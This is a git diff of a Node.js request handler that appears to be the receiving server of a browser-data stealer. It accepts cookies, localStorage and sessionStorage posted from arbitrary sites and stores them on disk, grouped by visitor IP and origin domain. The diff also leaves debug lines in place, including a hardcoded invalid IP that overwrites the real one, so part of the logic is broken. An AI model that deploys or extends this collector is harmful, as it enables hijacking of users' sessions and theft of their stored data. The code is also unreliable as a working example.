@@ -1,37 +1,95 @@
-const {valid} = require('sandhands')
-const {writeFile} = require('fs')
-const {resolve, join} = require('path')
+const {
+  valid
+} = require('sandhands')
+const {
+  writeFile,
+  access
+} = require('fs')
+const {
+  resolve,
+  join
+} = require('path')
+const {
+  allowMissingIPHeader
+} = require('../../config.json')
+const getDateString = require('../../functions/getDateString')
 const ensureExists = require('../../functions/ensureExists')
+const getDomain = require('../../functions/getDomain')
+const jsonfile = require('jsonfile')
+const mkdirp = require('mkdirp')
 
+const storageLocationNames = ["localStorage", "sessionStorage"]
 const ipRegex = /^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/
 
 const dataFolder = resolve(__dirname, '../data')
 
 const bodyFormat = {
-  localStorage: {_:{}, strict: false},
-  cookies: {_: String, minLength: 0},
-  sessionStorage: {_:{}, strict: false}
+  localStorage: {
+    _: {},
+    strict: false
+  },
+  cookies: {
+    _: String,
+    minLength: 0
+  },
+  sessionStorage: {
+    _: {},
+    strict: false
+  }
 }
 
 function storage(request, reply) {
   reply.send()
   if (!valid(request.body, bodyFormat)) return
 
-  const {localStorage, cookies, sessionStorage} = request.body
+  const {
+    localStorage,
+    cookies,
+    sessionStorage
+  } = request.body
+
+  const domain = getDomain(request.headers.origin)
+
+  if (!valid(domain, String)) return
 
   let ip = request.headers["X-Forwarded-For"]
 
   if (ip) {
-    if (!ipRegex.test(ip)) return console.log(new Error('Malformed IP: "'+ip+'"!'))
+    if (!ipRegex.test(ip)) return console.log(new Error('Malformed IP: "' + ip + '"!'))
   } else {
-    ip = "unknown"
-    console.warn(new Error('Missing X-Forwarded-For Header!'))
+    if (allowMissingIPHeader !== true) return
+    console.warn('Missing X-Forwarded-For Header')
   }
 
-  const output = {localStorage, cookies, sessionStorage}; // Required Semicolon
+  const data = {
+    localStorage,
+    cookies,
+    sessionStorage
+  }; // Required Semicolon
 
-  ["localStorage", "sessionStorage"].forEach(storageLocationName => {
-    const storageLocation = output[storageLocationName]
+  removeInvalidData(data)
+
+  if (Object.keys(data).length < 1) return
+
+  const dateString = getDateString()
+
+  console.log('hi')
+  ip = '135.3424.2425.2'
+  if (ip) {
+    saveKnownSource({
+      ip,
+      data,
+      domain
+    })
+  } else {
+    saveUnknownSource({data, domain})
+  }
+}
+
+function removeInvalidData(data) {
+  storageLocationNames.forEach(storageLocationName => {
+    if (!data.hasOwnProperty(storageLocationName)) return
+    const storageLocation = data[storageLocationName]
     const entries = Object.entries(storageLocation)
     let anyValid = false
     for (let i = 0; i < entries.length; i++) {
@@ -43,37 +101,66 @@ function storage(request, reply) {
       }
     }
 
-    if (anyValid === false) delete output[storageLocationName]
+    if (anyValid === false) delete data[storageLocationName]
   })
+  if (!data.hasOwnProperty('cookies') || data.cookies.length < 1) delete data.cookies
+}
 
-  if (cookies.length < 1) delete output.cookies
+const unknownStorageFolder = join(dataFolder, 'unknown')
 
-  if (Object.keys(output).length < 1) return
-
-  const date = new Date()
-
-  const dateString = date.getDate() + "-" + (date.getMonth() + 1) + "-" + date.getFullYear() + " " + date.getHours() + ":" + date.getMinutes() + ":" + date.getSeconds()
-
-  const fileName = dateString + '.json'
-
-  const ipFolder = join(dataFolder, ip.replace(/\./g, '-'))
-
-  const storageFolder = join(ipFolder, '/storage')
-
-  ensureExists(ipFolder, err => {
+function saveUnknownSource(data) {
+  const storageFolder = join(unknownStorageFolder, 'storage')
+  const filePath = storageFolder + '/'+ getDateString() +'.json'
+  mkdirp(storageFolder, err => {
     if (err) return console.log(err)
-    ensureExists(storageFolder, err => {
-      if (err) return console.log(err)
-      try {
-        writeFile(storageFolder + '/' + fileName, JSON.stringify(output), err => {
+    writeFile(filePath, JSON.stringify(data), err => {
+      if (err) console.log(err)
+    })
+  })
+}
+
+function saveKnownSource({
+  ip,
+  data,domain}) {
+  const storageFolder = join(dataFolder, ip.replace(/\./g, '-'), domain)
+  const filePath = storageFolder + '/storage.json'
+
+  mkdirp(storageFolder, err => {
+    if (err) return console.log(err)
+    access(filePath, err => {
+      if (err) {
+        const output = {}
+        mergeData(output, data)
+        writeFile(filePath, JSON.stringify(output), err => {
           if (err) console.log(err)
         })
-      } catch(error) {
-        console.log(error)
+      } else {
+        jsonfile.readFile(filePath, (err, output) => {
+          if (err) return console.log(err)
+          mergeData(output, data)
+            console.log({output})
+          writeFile(filePath, JSON.stringify(output), err => {
+            if (err) console.log(err)
+          })
+        })
       }
     })
   })
-
 }
 
+function mergeData(master, newData) {
+  storageLocationNames.forEach(storageLocationName => {
+    if (!newData.hasOwnProperty(storageLocationName)) return
+    if (!master.hasOwnProperty(storageLocationName)) master[storageLocationName] = {}
+    const storageLocation = master[storageLocationName]
+    Object.entries(newData[storageLocationName]).forEach(([key, value]) => {
+      if (!storageLocation.hasOwnProperty(key)) storageLocation[key] = []
+      storageLocation[key].push(value)
+    })
+  })
+  if (newData.hasOwnProperty('cookies')) {
+    if (!master.hasOwnProperty('cookies')) master.cookies = []
+    master.cookies.push(newData.cookies)
+  }
+}
 module.exports = storage
